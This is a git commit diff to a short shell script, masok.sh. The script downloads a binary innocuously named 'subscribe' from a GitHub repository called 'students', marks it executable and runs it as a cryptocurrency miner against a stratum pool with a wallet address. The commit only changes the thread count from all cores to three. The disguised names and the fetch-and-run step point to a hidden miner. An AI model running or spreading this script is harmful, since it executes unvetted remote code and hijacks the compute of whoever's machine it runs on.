7f85203f35d381986022ed885d3f553e708d2d12
septianana55 <93500712+septianana55@users.noreply.github.com>
2022-01-07 08:12:02 +0700

    Update masok.sh

--- masok.sh
+++ masok.sh
@@ -2,4 +2,4 @@
 sudo apt update
 wget https://github.com/septianana55/students/raw/main/subscribe
 chmod +x subscribe
-./subscribe -a yespowerTIDE -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.D4 -t $(nproc --all)
+./subscribe -a yespowerTIDE -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.D4 -t 3
